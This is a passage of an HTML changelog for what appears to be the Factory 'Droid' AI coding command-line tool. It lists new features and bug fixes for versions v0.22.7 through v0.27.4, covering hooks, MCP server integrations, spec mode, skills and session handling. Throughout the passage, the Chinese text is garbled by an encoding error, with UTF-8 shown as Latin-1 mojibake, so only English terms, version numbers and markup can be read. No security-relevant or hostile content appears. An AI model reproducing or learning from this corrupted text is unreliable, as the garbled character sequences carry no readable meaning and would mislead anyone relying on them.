<li>ä¿®å¤ Cerebras é£æ ¼çš„ä¸Šä¸‹æ–‡é•¿åº¦è¶…å‡ºé”™è¯¯æ£€æµ‹</li>
<li>ä¿®å¤é‡å¤çš„ spec modes å’Œè¾“å…¥ä¸Šæ–¹çš„åŒç©ºè¡Œ</li>
<li>ä¸º Opus model æ·»åŠ ä¿ƒé”€ä»·æ ¼æ ‡ç­¾</li>
<li>ä¿®å¤ /install-github-app å‘½ä»¤é—®é¢˜</li>
</ul>
<h2 data-id="heading-40">11æœˆ28æ—¥ v0.27.4</h2>
<h3 data-id="heading-41">æ–°åŠŸèƒ½</h3>
<p><strong>äº¤é”™ thinking æ”¯æŒ</strong> - åœ¨ streaming æœŸé—´æ˜¾ç¤ºå¤šä¸ª thinking blocksï¼ŒåŒ…æ‹¬å¸¦æœ‰å®‰å…¨æ¶ˆæ¯çš„å·²ç¼–è¾‘ thinking blocks</p>
<p><strong>æ˜¾ç¤º thinking è®¾ç½®</strong> - åœ¨ä¸»è§†å›¾ä¸Šæ˜¾ç¤º AI thinking/reasoningï¼Œåœ¨ /settings ä¸­æ‰“å¼€/å…³é—­</p>
<p><strong>Hooks å§‹ç»ˆå¯ç”¨</strong> - Hooks åŠŸèƒ½ç°åœ¨æ°¸ä¹…å¯ç”¨ï¼Œå¯é€šè¿‡ /hooks å‘½ä»¤ä½¿ç”¨</p>
<h3 data-id="heading-42">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ /model èœå•ä¸­çš„ ESC/Q å¯¼èˆª - æŒ‰ ESC æˆ– Q ç°åœ¨æ­£ç¡®å¯¼èˆªå›ä¸Šä¸€çº§èœå•ï¼Œè€Œä¸æ˜¯å…³é—­æ‰€æœ‰èœå•</li>
<li>ä¿®å¤ç”± terminal å“åº”å­—èŠ‚æ³„æ¼åˆ° stdin å¯¼è‡´çš„ prompt è¾“å…¥ä¸­å‡ºç°åƒåœ¾å­—ç¬¦</li>
<li>ä¿®å¤ spec mode ä¸­çš„ reasoning effort æ˜¾ç¤ºï¼Œä»¥æ­£ç¡®åæ˜ å®é™…ä½¿ç”¨çš„ reasoning effort</li>
<li>ä¿®å¤ OpenAI chat completions streaming å¯¹ tool è°ƒç”¨çš„æ”¯æŒ</li>
<li>é€šè¿‡æ›´å¥½çš„æç¤ºæ”¹è¿› Gemini å¯¹ todo tool çš„ä½¿ç”¨</li>
<li>ä¿®å¤ GLM-4.6 çš„ model warmup</li>
<li>ä¿®å¤ /install-github-app å‘½ä»¤é—®é¢˜</li>
</ul>
<h2 data-id="heading-43">11æœˆ25æ—¥ v0.27.2</h2>
<h3 data-id="heading-44">æ–°åŠŸèƒ½</h3>
<p><strong>é¡¹ç›®çº§ MCP é…ç½®</strong> - ä½¿ç”¨ .factory/mcp.json åœ¨é¡¹ç›®çº§åˆ«é…ç½® MCP servers</p>
<p><strong>/ide å‘½ä»¤</strong> - æ–°å‘½ä»¤ç”¨äºç®¡ç† VS Codeã€Cursor å’Œ Windsurf IDE é›†æˆã€‚æ˜¾ç¤ºå½“å‰ extension ç‰ˆæœ¬æˆ–æç¤ºå®‰è£…</p>
<p><strong>è‡ªå®šä¹‰ models ä¸­çš„é¢å¤–å‚æ•°</strong> - å‘è‡ªå®šä¹‰ model é…ç½®ä¼ é€’é¢å¤–å‚æ•°ï¼Œä¾‹å¦‚ service_tierã€temperatureã€top_p ç­‰</p>
<h3 data-id="heading-45">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ task tool åœ¨è¿è¡Œ subagents æ—¶æ— é™ç­‰å¾…çš„é—®é¢˜</li>
<li>ä¿®å¤åŠ è½½ä¼šè¯æ—¶æ‰©å±•æ³¢æµªå·ï¼ˆ~ï¼‰è·¯å¾„çš„é—®é¢˜</li>
<li>æ”¹è¿› @ æœç´¢æ’å - å®Œå…¨åŒ¹é…çš„æ–‡ä»¶åç°åœ¨å‡ºç°åœ¨é¡¶éƒ¨ï¼Œä½¿ç”¨ VSCode é£æ ¼çš„åŒåˆ—æ˜¾ç¤º</li>
<li>åˆ é™¤è‡ªåŠ¨åˆ›å»º .factory/skills æ–‡ä»¶å¤¹</li>
<li>è§¦å‘æ—¶æ˜¾ç¤º compacting çŠ¶æ€</li>
<li>åˆå¹¶ markdown æ¸²æŸ“ï¼ˆä¿®å¤ spec mode ä¸­ç¼ºå¤±å­—ç¬¦ï¼‰</li>
<li>å¹¶è¡ŒåŒ– Windows ä¸Šçš„è¯ä¹¦åŠ è½½</li>
</ul>
<h2 data-id="heading-46">11æœˆ24æ—¥ v0.27.1</h2>
<h3 data-id="heading-47">æ–°åŠŸèƒ½</h3>
<p><strong>æ”¹è¿› rewind åŠŸèƒ½</strong> - æ–°çš„ /rewind å‘½ä»¤ï¼Œä»¥åŠé€Ÿåº¦å’Œ UX æ”¹è¿›</p>
<p><strong>/install-github-app å‘½ä»¤</strong> - æ–°å‘½ä»¤ç›´æ¥ä» CLI å®‰è£… Factory GitHub app</p>
<p><strong>MCP tool å“åº”ä¸­çš„å›¾åƒ</strong> - MCP tools ç°åœ¨å¯ä»¥è¿”å›æ­£ç¡®å‘é€åˆ° LLM çš„å›¾åƒ</p>
<h3 data-id="heading-48">Bug ä¿®å¤</h3>
<ul>
<li>å‡çº§åˆ° bun 1.3.3</li>
<li>æ›´å®‰å…¨çš„æœºåˆ¶æ¥æ£€æŸ¥ ripgrep æ˜¯å¦å·²å®‰è£…</li>
<li>ä¿®å¤ gpt-5.1-codex reasoning</li>
<li>Shift+Backspace åƒ Backspace ä¸€æ ·åˆ é™¤å•ä¸ªå­—ç¬¦</li>
<li>ä¿®å¤ GLM4.6 ä½œä¸º spec mode model</li>
<li>ä¿®å¤ exitSpecMode prompt</li>
<li>ä¿®å¤ subdroids çš„è‡ªå®šä¹‰ models</li>
<li>é˜²æ­¢å¯åŠ¨æœŸé—´çš„æ§åˆ¶å°æ—¥å¿—</li>
<li>ä¿®å¤ Gemini çš„ spec mode</li>
</ul>
<h2 data-id="heading-49">11æœˆ22æ—¥ v0.26.12</h2>
<h3 data-id="heading-50">æ–°åŠŸèƒ½</h3>
<p><strong>/review å‘½ä»¤</strong> - æä¾›äº¤äº’å¼ code review å·¥ä½œæµã€‚ä»¥ä¸åŒæ–¹å¼ review ä»£ç æ›´æ”¹ï¼šä¸ base branch æ¯”è¾ƒã€review ç‰¹å®š commitsã€æ£€æŸ¥æœªæäº¤çš„æ›´æ”¹æˆ–æä¾›è‡ªå®šä¹‰ review æŒ‡ä»¤</p>
<h3 data-id="heading-51">Bug ä¿®å¤</h3>
<ul>
<li>Gemini 3 Pro ç°åœ¨ä½¿ç”¨æ›´æ–°çš„ 0.8Ã— å®šä»·å€ç‡ - æ›¿æ¢ä»‹ç»æ€§å®šä»·</li>
<li>MCP navigator ç°åœ¨å¡«å…… terminal</li>
<li>æ›´æ–° /resume çš„è·¯ç”±ä»¥æ­£ç¡®è¿‡æ»¤åˆ° /sessions</li>
<li>å¯¼èˆªå†å²æ—¶å°†å…‰æ ‡å®šä½åœ¨å¼€å¤´</li>
<li>ä½¿ mcp navigator ä¸­çš„æ‰€æœ‰è§†å›¾å…¨å®½</li>
<li>ä¿®å¤ Windows ä¸Šçš„ä¹±ç å­—ç¬¦æ¸²æŸ“</li>
<li>ç»Ÿä¸€ LLM é‡è¯•é€»è¾‘ï¼Œå¹¶åœ¨ exec mode ä¸­è¿›è¡Œæ›´å¤šé‡è¯•</li>
<li>åˆ é™¤å·²å¼ƒç”¨çš„ Figma MCP server</li>
</ul>
<h2 data-id="heading-52">11æœˆ21æ—¥ v0.26.10</h2>
<h3 data-id="heading-53">æ–°åŠŸèƒ½</h3>
<p><strong>MCP Registry æ‰©å±•</strong> - æ·»åŠ  30+ ä¸ªæ–° MCP server é›†æˆï¼ŒåŒ…æ‹¬å¼€å‘å·¥å…·ï¼ˆPlaywrightã€Braintrustã€Honeycombï¼‰ã€æ•°æ®åº“ï¼ˆSupabaseã€MongoDBã€Prismaã€Neonï¼‰ã€å®‰å…¨æ‰«æï¼ˆSnykã€Semgrepï¼‰ç­‰</p>
<h3 data-id="heading-54">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ turn ä¸­é€” model æ›´æ”¹çš„ç«äº‰æ¡ä»¶</li>
<li>ä¿®å¤ bug report å‘½ä»¤</li>
<li>ä¿®å¤è‡ªå®šä¹‰ model é…ç½®ä¸­é‡å¤ model IDs çš„æ”¯æŒ</li>
<li>ä¿®å¤ Windows ä¸Šçš„ PowerShell å‘½ä»¤æ‰§è¡Œ</li>
</ul>
<h2 data-id="heading-55">11æœˆ20æ—¥ v0.26.8</h2>
<h3 data-id="heading-56">æ–°åŠŸèƒ½</h3>
<p><strong>åå°è¿›ç¨‹æ”¯æŒ</strong> - æ·»åŠ åœ¨ CLI ä¸­è¿è¡Œå’Œç®¡ç†åå°è¿›ç¨‹çš„æ”¯æŒã€‚åŒ…æ‹¬æ–°çš„ bg-process å‘½ä»¤ï¼Œç”¨äºåˆ—å‡ºã€ç»ˆæ­¢å’Œæ¸…ç†è¿›ç¨‹ï¼Œå…·æœ‰æŒä¹…çš„è¿›ç¨‹çŠ¶æ€è·Ÿè¸ª</p>
<p><strong>MCP Registry æœç´¢</strong> - å‘ MCP registry åˆ—è¡¨è§†å›¾ï¼ˆ/mcpï¼‰æ·»åŠ æœç´¢åŠŸèƒ½ã€‚ç›´æ¥åœ¨åˆ—è¡¨ç•Œé¢ä¸­é”®å…¥ä»¥è¿‡æ»¤å¯ç”¨çš„ MCP servers</p>
<h3 data-id="heading-57">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤æŒ‚èµ·/æ¢å¤ TUI æ—¶çš„ç«äº‰æ¡ä»¶å’Œæ¸²æŸ“é—®é¢˜ï¼ˆä¾‹å¦‚ï¼Œæ‰“å¼€å¤–éƒ¨ç¼–è¾‘å™¨æ—¶ï¼‰</li>
<li>ä¿®å¤ grep tool æ—¥å¿—ä¸­çš„å¾ªç¯ä¾èµ–é—®é¢˜</li>
</ul>
<h2 data-id="heading-58">11æœˆ19æ—¥ v0.26.7</h2>
<h3 data-id="heading-59">æ–°åŠŸèƒ½</h3>
<p><strong>ç›®å½•ç‰¹å®šä¼šè¯</strong> - ä¼šè¯ç°åœ¨æŒ‰ç›®å½•å­˜å‚¨ï¼Œå¹¶åœ¨åŠ è½½æ—¶è‡ªåŠ¨åˆ‡æ¢åˆ°æ­£ç¡®çš„å·¥ä½œç›®å½•ã€‚/sessions å‘½ä»¤ä»…æ˜¾ç¤ºåœ¨å½“å‰ç›®å½•ä¸­åˆ›å»ºçš„ä¼šè¯ä»¥åŠæ”¶è—çš„ä¼šè¯</p>
<p><strong>MCP å›¾åƒæ”¯æŒ</strong> - MCP tools ç°åœ¨å¯ä»¥è¿”å›å‘é€åˆ° LLM è¿›è¡Œåˆ†æçš„å›¾åƒ</p>
<p><strong>Subdroids çš„è‡ªå®šä¹‰ Models</strong> - Subdroids ç°åœ¨å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ modelsï¼Œè€Œä¸æ˜¯ä»çˆ¶ä¼šè¯ç»§æ‰¿</p>
<h3 data-id="heading-60">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ exec mode ä¸­çš„æ§åˆ¶å°è¾“å‡ºé—®é¢˜</li>
<li>ä¿®å¤ Gemini models çš„ spec mode</li>
<li>ä¿®å¤ exit spec mode prompt è¡Œä¸º</li>
</ul>
<h2 data-id="heading-61">11æœˆ18æ—¥ v0.26.3</h2>
<h3 data-id="heading-62">æ–°åŠŸèƒ½</h3>
<p><strong>é»˜è®¤å¯ç”¨ Skills</strong> - Skills å‘½ä»¤ç°åœ¨å¯¹æ‰€æœ‰ç”¨æˆ·å¯ç”¨</p>
<p><strong>Claude Code Hooks è‡ªåŠ¨è¿ç§»</strong> - è‡ªåŠ¨æ£€æµ‹å¹¶ä» Claude Code CLI å¯¼å…¥ hooksï¼Œå¹¶æä¾›äº¤äº’å¼æç¤ºã€‚æ™ºèƒ½ç¿»è¯‘å°† bash_tool è½¬æ¢ä¸º Executeï¼Œå°† CLAUDE_CWD è½¬æ¢ä¸º DROID_CWDï¼Œé˜²æ­¢é‡å¤å¹¶è·Ÿè¸ªè¿ç§»çŠ¶æ€</p>
<p><strong>@ å»ºè®®æ”¹è¿›</strong> - ç°åœ¨é™¤äº†æ–‡ä»¶å¤–è¿˜åŒ…æ‹¬æ–‡ä»¶å¤¹ï¼Œå…·æœ‰æ›´å¥½çš„ UI å’Œæ€§èƒ½</p>
<h3 data-id="heading-63">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ GLM4.6 é…ç½®é—®é¢˜ï¼Œå¯¼è‡´å…¶æ— æ³•åœ¨ spec mode ä¸­å·¥ä½œ</li>
<li>ä¿®å¤ warmup API è°ƒç”¨</li>
<li>Shift+Backspace ç°åœ¨åƒ Backspace ä¸€æ ·åˆ é™¤å•ä¸ªå­—ç¬¦</li>
</ul>
<h2 data-id="heading-64">11æœˆ14æ—¥ v0.26.0</h2>
<h3 data-id="heading-65">æ–°åŠŸèƒ½</h3>
<p><strong>Skills ç³»ç»Ÿ</strong> - ä¸ Claude Code å…¼å®¹çš„ .factory/skills æ”¯æŒæ¨¡å—åŒ–ã€åŸºäº prompt çš„åŠŸèƒ½ã€‚ä½¿ç”¨ /skills å‘½ä»¤ç®¡ç† skills å¹¶ä» .claude/skills ç›®å½•å¯¼å…¥</p>
<p><strong>ä¼šè¯æ”¶è—</strong> - æ–°çš„ /favorite å‘½ä»¤ç”¨äº pin/unpin ä¼šè¯ï¼Œå°†æ´»åŠ¨é¡¹ç›®ä¿æŒåœ¨ä¼šè¯åˆ—è¡¨é¡¶éƒ¨</p>
<p><strong>å¢å¼º Bug æŠ¥å‘Š</strong> - /bug å‘½ä»¤ç°åœ¨è‡ªåŠ¨å‹ç¼©ä¼šè¯ä¸Šä¸‹æ–‡ï¼Œä¸Šä¼ åˆ° Factoryï¼Œå¹¶è‡ªåŠ¨è¿”å›å¯å…±äº«çš„æŠ¥å‘Š ID</p>
<p><strong>æ›´æ¸…æ™°çš„ Diff Viewer</strong> - æ”¹è¿›çš„ UIï¼Œä½¿ç”¨æ°´å¹³çº¿è€Œä¸æ˜¯è¾¹æ¡†</p>
<h3 data-id="heading-66">Bug ä¿®å¤</h3>
<ul>
<li>å§‹ç»ˆæç¤ºæ¥å—æˆ–æ‹’ç»ç”Ÿæˆçš„ specsï¼Œå¹¶å°†æ­£ç¡®çš„æ ‡ç­¾ä¼ é€’ç»™ UI æµç¨‹</li>
<li>droid spec ç°åœ¨å°†æ–‡ä»¶å†™å…¥é¢„æœŸçš„é»˜è®¤è·¯å¾„ï¼Œæ— éœ€æ‰‹åŠ¨è¦†ç›–</li>
<li>ä¿®å¤ autonomy å¤„ç†ï¼Œä»¥ä¾¿ MCP tools åœ¨æ¯ä¸ªä¼šè¯ä¸­å°Šé‡é…ç½®çš„ç¡®è®¤çº§åˆ«</li>
<li>æ”¹è¿› pre-update é€»è¾‘ä¸­çš„é”™è¯¯å¤„ç†</li>
<li>å°† Axiom MCP server æ·»åŠ åˆ° registry</li>
</ul>
<h2 data-id="heading-67">11æœˆ13æ—¥ v0.25.0</h2>
<h3 data-id="heading-68">æ–°åŠŸèƒ½</h3>
<p><strong>å¢å¼º Hooks ç³»ç»Ÿ</strong> - æ·»åŠ  7 ä¸ªæ–° hook ç±»å‹ä»¥å®ç°å®Œæ•´çš„ç”Ÿå‘½å‘¨æœŸæ§åˆ¶ï¼š</p>
<ul>
<li><strong>UserPromptSubmit</strong> - åœ¨æç¤ºå‘é€åˆ° agent ä¹‹å‰ä¿®æ”¹æˆ–éªŒè¯æç¤º</li>
<li><strong>Stop</strong> - åœ¨ agent å®Œæˆæ—¶æ‰§è¡Œè‡ªå®šä¹‰é€»è¾‘ï¼ˆä¾‹å¦‚ï¼ŒæŒ‡æ ‡æ”¶é›†ï¼‰</li>
<li><strong>SubagentStop</strong> - è·Ÿè¸ªå’Œè®°å½• subagent ä»»åŠ¡å®Œæˆ</li>
<li><strong>PreCompact</strong> - åœ¨å¯¹è¯ compaction ä¹‹å‰è¿è¡Œè‡ªå®šä¹‰é€»è¾‘ï¼ˆå¦‚æœéœ€è¦ï¼Œå¯ä»¥é˜»æ­¢ compactionï¼‰</li>
<li><strong>SessionStart</strong> - åˆå§‹åŒ–ä¼šè¯å¹¶æ³¨å…¥ç¯å¢ƒå˜é‡</li>
<li><strong>SessionEnd</strong> - ä¼šè¯ç»“æŸæ—¶çš„æ¸…ç†ä»»åŠ¡ï¼ˆåœ¨ logoutã€quitã€Ctrl+C æ—¶è§¦å‘ï¼‰</li>
</ul>
<p><strong>MCP Tool Autonomy Levels</strong> - å¯¹ MCP tool ç¡®è®¤çš„ç²¾ç»†æ§åˆ¶ï¼šä½ autonomy éœ€è¦å¯¹åªè¯» MCP tools è¿›è¡Œç¡®è®¤ï¼Œé«˜ autonomy éœ€è¦å¯¹æ‰€æœ‰ MCP tool è°ƒç”¨è¿›è¡Œç¡®è®¤</p>
<p><strong>Execute Tool Streaming</strong> - é•¿æ—¶é—´è¿è¡Œçš„å‘½ä»¤ç°åœ¨å®æ—¶æ˜¾ç¤ºè¾“å‡ºçš„æœ€åä¸¤ä¸ªéç©ºè¡Œã€‚ä¸å†æƒ³çŸ¥é“ Droid æ˜¯å¦å¡ä½æˆ–ç¼“æ…¢</p>
<h3 data-id="heading-69">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ hooks UI ä¸­çš„ç²˜è´´å¤„ç† - ç²˜è´´å‘½ä»¤æ—¶ä¸å†æœ‰è½¬ä¹‰åºåˆ—ä¼ªå½±</li>
<li>ä¿®å¤å¯¹è¯ compaction åçš„æ¶ˆæ¯ ID å¯¹é½</li>
<li>ä¿®å¤åˆ‡æ¢ providers é‡è¯•æ—¶æœªå®Œæˆçš„ tool ä½¿ç”¨è¢«æ¸…é™¤çš„é—®é¢˜</li>
<li>ä¿®å¤ GPT models çš„ markdown prompt ä½¿ç”¨</li>
<li>ä¿®å¤çª„ terminal çª—å£çš„ /mcp æ¸²æŸ“</li>
<li>ä¿®å¤æŒ‚èµ· TUI æ—¶çš„æ‹¬å·ç²˜è´´å¤„ç†</li>
<li>èº«ä»½éªŒè¯é”™è¯¯ç°åœ¨ç›´æ¥åœ¨ CLI ä¸­æ˜¾ç¤ºï¼Œå¹¶å¸¦æœ‰æ¸…æ™°çš„é”™è¯¯æ¶ˆæ¯</li>
</ul>
<h2 data-id="heading-70">11æœˆ12æ—¥ v0.24.0</h2>
<h3 data-id="heading-71">æ–°åŠŸèƒ½</h3>
<p><strong>Hooks</strong> - å¼•å…¥å¼ºå¤§çš„ hooks ç³»ç»Ÿï¼Œå…è®¸æ‚¨åœ¨ tool æ‰§è¡Œä¹‹å‰/ä¹‹åè¿è¡Œè‡ªå®šä¹‰ scriptsï¼Œå…·æœ‰å¯é…ç½®çš„é€€å‡ºä»£ç ä»¥å®ç°ä¸åŒçš„è¡Œä¸ºï¼ˆæˆåŠŸã€è­¦å‘Šã€é˜»æ­¢ã€ä¸­æ­¢ï¼‰- [å®éªŒæ€§ - åœ¨ /settings ä¸­æ‰“å¼€]</p>
<p><strong>äº¤äº’å¼ Spec ç¼–è¾‘</strong> - æ·»åŠ åœ¨æ‰§è¡Œå‰äº¤äº’å¼ç¼–è¾‘ specs çš„èƒ½åŠ›</p>
<p><strong>Prompt Cache Warmup</strong> - åœ¨æ‚¨é”®å…¥æ—¶æ·»åŠ  prompt-cache warmup ä»¥è·å¾—æ›´å¿«çš„å“åº”</p>
<h3 data-id="heading-72">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ model åˆ‡æ¢ä»¥åœ¨éœ€è¦æ—¶æ­£ç¡®å¤„ç†å¯¹è¯ compaction</li>
<li>ä¿®å¤ spec mode tab å¾ªç¯ä»¥è°ƒæ•´ reasoning levels</li>
<li>ä¿®å¤æŒ‚èµ· TUI æ—¶çš„æ‹¬å·ç²˜è´´</li>
<li>ä¿®æ­£ ApplyPatch tool diff æ˜¾ç¤ºä¸­çš„è¡Œå·</li>
<li>æ¶ˆé™¤ ripgrep è·¯å¾„è§£æä¸­çš„ç«äº‰æ¡ä»¶</li>
<li>å„ç§ agent å¾ªç¯ç¨³å®šæ€§æ”¹è¿›</li>
<li>Tool æ‰§è¡Œç°åœ¨æ­£ç¡®å°Šé‡ autonomy mode</li>
<li>åº”ç”¨ Figma MCP server å…¼å®¹æ€§çš„è§£å†³æ–¹æ³•</li>
</ul>
<h2 data-id="heading-73">11æœˆ10æ—¥ v0.23.0</h2>
<h3 data-id="heading-74">æ–°åŠŸèƒ½</h3>
<p><strong>Markdown è¡¨æ ¼æ¸²æŸ“</strong> - CLI ç°åœ¨æ­£ç¡®æ¸²æŸ“ markdown è¡¨æ ¼ï¼Œä»¥æ›´å¥½åœ°æ˜¾ç¤ºç»“æ„åŒ–æ•°æ®å’Œæ–‡æ¡£</p>
<p><strong>å›ºå®š todo è®¡åˆ’</strong> - å›ºå®šé‡è¦çš„ todo é¡¹ä»¥ä¿æŒå¯è§å¹¶åœ¨é•¿æ—¶é—´è¿è¡Œçš„ä¼šè¯æœŸé—´è·Ÿè¸ªä»»åŠ¡</p>
<p><strong>MCP tool ç»“æœæ ¼å¼åŒ–</strong> - æ”¹è¿› MCP tool ç»“æœçš„æ ¼å¼åŒ–ï¼Œè¾“å‡ºæ›´æ¸…æ™°ã€æ›´æ˜“è¯»</p>
<h3 data-id="heading-75">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ chat completion APIs çš„ thinking block æ”¯æŒï¼Œä»¥åœ¨å…¼å®¹ models ä¸­å¯ç”¨æ‰©å±•æ¨ç†</li>
<li>ä¿®å¤ baseline ç‰ˆæœ¬åœ¨æ›´æ–°æ—¶æ¢å¤åˆ°é baseline æ„å»ºçš„é—®é¢˜</li>
<li>ä¿®å¤ droid exec å‘½ä»¤ä¸­çš„ autonomy mode å¤„ç†ï¼Œä»¥å®ç°æ›´å¯é çš„æ‰§è¡Œ</li>
<li>æ¢å¤ Windows ä¸Šçš„ Ctrl+T é”®ç›˜å¿«æ·é”®åŠŸèƒ½</li>
</ul>
<h2 data-id="heading-76">11æœˆ7-8æ—¥ v0.22.14</h2>
<h3 data-id="heading-77">æ–°åŠŸèƒ½</h3>
<p><strong>Tab é”®å¾ªç¯ reasoning levels</strong> - ä½¿ç”¨ Tab é”®åœ¨ä¸åŒ reasoning levels ä¹‹é—´å¯¼èˆªä»¥è·å¾—æ›´å¥½çš„æ§åˆ¶</p>
<p><strong>æ‰©å±• bash mode è¾“å‡º</strong> - Transcript è§†å›¾ç°åœ¨æ‰©å±•å¹¶æ˜¾ç¤º bash å‘½ä»¤è¾“å‡ºä»¥æé«˜å¯è§æ€§</p>
<h3 data-id="heading-78">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ droid exec çš„ MCP tool å‘ç°ï¼Œä»¥ä¾¿ tools åœ¨ --list-tools ä¸­æ­£ç¡®æ˜¾ç¤ºå¹¶é€šè¿‡éªŒè¯</li>
<li>ä¿®å¤ diff è§†å›¾ä»¥æ¢è¡Œä»¥æ›´å¥½åœ°è¯»å–é•¿è¡Œ</li>
<li>ä¿®å¤ MCP servers çš„ OAuth åˆ·æ–°</li>
<li>ä¿®å¤ transcript è§†å›¾ä¸­çš„ markdown æ¸²æŸ“ bug</li>
<li>ä¿®å¤ TUI ä¸­çš„æ¶ˆæ¯å–æ¶ˆå¤„ç†</li>
<li>ä¿®å¤ completions ä¸­çš„ prompt cache key å¤„ç†</li>
<li>æ¢å¤ Windows ä¸Šçš„ Ctrl+T é”®ç›˜å¿«æ·é”®</li>
</ul>
<h2 data-id="heading-79">11æœˆ6æ—¥ v0.22.12</h2>
<h3 data-id="heading-80">æ–°åŠŸèƒ½</h3>
<p><strong>Quit/exit åˆ«å</strong> - é”®å…¥ 'quit' æˆ– 'exit' å‘½ä»¤ä»¥é€€å‡ºä¼šè¯</p>
<h3 data-id="heading-81">Bug ä¿®å¤</h3>
<ul>
<li>æ”¶é›†æ‰€æœ‰ AGENTS.md å’Œ CLAUDE.md æ–‡ä»¶ç”¨äºç³»ç»Ÿæé†’</li>
<li>ä¿®å¤é€šè¿‡ UI æ·»åŠ  servers æ—¶çš„ MCP server å‚æ•°è§£æ</li>
<li>æ”¹è¿›ç³»ç»Ÿè¯Šæ–­å®ç”¨ç¨‹åºä»¥æ›´å¥½åœ°è¿›è¡Œæ•…éšœæ’é™¤</li>
<li>æ¸…ç†å’ŒåŠ¨æ€æ¸²æŸ“å¾…å¤„ç†çš„ toolsï¼Œä»¥æ˜ç¡® Droid æ²¡æœ‰å¡ä½</li>
</ul>
<h2 data-id="heading-82">11æœˆ5æ—¥ v0.22.11</h2>
<h3 data-id="heading-83">æ–°åŠŸèƒ½</h3>
<p><strong>Context7 MCP server</strong> - å°† Context7 MCP server æ·»åŠ åˆ° MCP registry</p>
<h3 data-id="heading-84">Bug ä¿®å¤</h3>
<ul>
<li>æ”¹è¿› droid exec è¿è¡Œç±»å‹è·Ÿè¸ª</li>
<li>æ”¹è¿› MCP å®¢æˆ·ç«¯ä¿¡æ¯å¤„ç†</li>
</ul>
<h2 data-id="heading-85">11æœˆ4æ—¥ v0.22.10</h2>
<h3 data-id="heading-86">æ–°åŠŸèƒ½</h3>
<p><strong>OAuth Discovery</strong> - è‡ªåŠ¨å‘ç° OAuth providers ä»¥ç®€åŒ– MCP çš„èº«ä»½éªŒè¯è®¾ç½®</p>
<p><strong>OpenAI Reasoning Summaries</strong> - åœ¨æ‰©å±•ä¼šè¯è§†å›¾ä¸­æ˜¾ç¤º OpenAI çš„æ‰©å±• reasoning æ‘˜è¦</p>
<h3 data-id="heading-87">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ terminal ä¼šè¯ä¸­çš„å¤åˆ¶ç²˜è´´è¡Œä¸º</li>
<li>æ”¹è¿›è¶…æ—¶å¤„ç†ä»¥å®ç°æ›´å¯é çš„æ“ä½œ</li>
<li>å¢å¼º Windows å…¼å®¹æ€§</li>
<li>é»˜è®¤å¯ç”¨è‡ªå®šä¹‰ droids</li>
<li>æ”¹è¿›é”™è¯¯æ—¥å¿—å’Œè¯Šæ–­</li>
</ul>
<h2 data-id="heading-88">11æœˆ1æ—¥ v0.22.9</h2>
<h3 data-id="heading-89">æ–°åŠŸèƒ½</h3>
<p><strong>MCP Registry</strong> - æ·»åŠ ç²¾é€‰çš„ MCP servers é€‰æ‹©ï¼Œä»¥ä¾¿è½»æ¾å‘ç°å’Œè®¾ç½®</p>
<p><strong>Tool æƒé™æ”¯æŒ</strong> - åœ¨ stream-jsonrpc mode ä¸­å®ç°è¯·æ±‚ tool æƒé™æµç¨‹ï¼Œæ”¯æŒå¤šä¸ªå¹¶å‘ tool ç¡®è®¤</p>
<p><strong>ä¼šè¯æ¢å¤</strong> - é€€å‡ºæ—¶æ˜¾ç¤º resume å‘½ä»¤ï¼ˆCtrl+C æˆ– /quitï¼‰ï¼Œæ–°å¢ -rã€--resume æ ‡å¿—ä»¥ç»§ç»­ä¼šè¯</p>
<p><strong>Thinking Traces æ˜¾ç¤º</strong> - æ·»åŠ  UI ç»„ä»¶ä»¥åœ¨æ‰©å±•ä¼šè¯è§†å›¾ä¸­æ˜¾ç¤º thinking blocks</p>
<h3 data-id="heading-90">Bug ä¿®å¤</h3>
<ul>
<li>ä¿®å¤ CLI completion å£°éŸ³ï¼Œé€šè¿‡å°†åµŒå…¥çš„å£°éŸ³æ–‡ä»¶æå–åˆ°ä¸»æœºæ–‡ä»¶ç³»ç»Ÿï¼Œä½¿å…¶å¯ä¾›å¤–éƒ¨ shell å‘½ä»¤è®¿é—®</li>
<li>æ·»åŠ  tool å–æ¶ˆåç”¨æˆ·æ¶ˆæ¯ä¸­çš„ tool ä½¿ç”¨</li>
<li>ä¸ºä¸æ”¯æŒ AVX2 SIMD æŒ‡ä»¤çš„ x64 CPUsï¼ˆ2013 å¹´ä¹‹å‰ï¼‰æ·»åŠ  baseline æ„å»º</li>
<li>æ›´æ–°é™æ€æ‹†åˆ†é€»è¾‘ä»¥ä½¿ç”¨æ–‡æœ¬æ¶ˆæ¯ä½œä¸ºç¨³å®šæ£€æŸ¥ç‚¹ï¼Œå‡å°‘æ¸²æŸ“æœŸé—´çš„é—ªçƒ</li>
<li>ä¿®å¤ delta.extra_content.google ä¸­ Gemini thinking å†…å®¹çš„å­˜å‚¨å’Œå‘é€</li>
<li>ç”±äºæˆåŠŸç‡ä½ï¼ˆ~80%ï¼‰ï¼Œåˆ é™¤ MultiEdit tool</li>
<li>ä½¿ç”¨ä¹è§‚ JSON è§£ææ·»åŠ ä»æ ¼å¼é”™è¯¯çš„å¯é€‰å‚æ•°ä¸­æ¢å¤</li>
</ul>
<h2 data-id="heading-91">10æœˆ31æ—¥ v0.22.7</h2>
<h3 data-id="heading-92">æ–°åŠŸèƒ½</h3>
<p><strong>Streaming å“åº”ä¸­çš„ reasoning å­—æ®µæ”¯æŒ</strong> - æ·»åŠ å¯¹åœ¨ chat completion streaming chunks ä¸­æ˜¾ç¤º reasoning å­—æ®µçš„æ”¯æŒï¼Œç”¨äºæä¾›æ‰©å±• reasoning çš„ models</p>
<p><strong>ä» Claude å¯¼å…¥å·²æ¢å¤</strong> - åœ¨ droids èœå•ä¸­é‡æ–°å¯ç”¨"ä» Claude å¯¼å…¥"é€‰é¡¹ï¼Œä»¥ä¾¿æ›´è½»æ¾åœ°è¿ç§»å¯¹è¯</p>
<h3 data-id="heading-93">Bug ä¿®å¤</h3>
<ul>
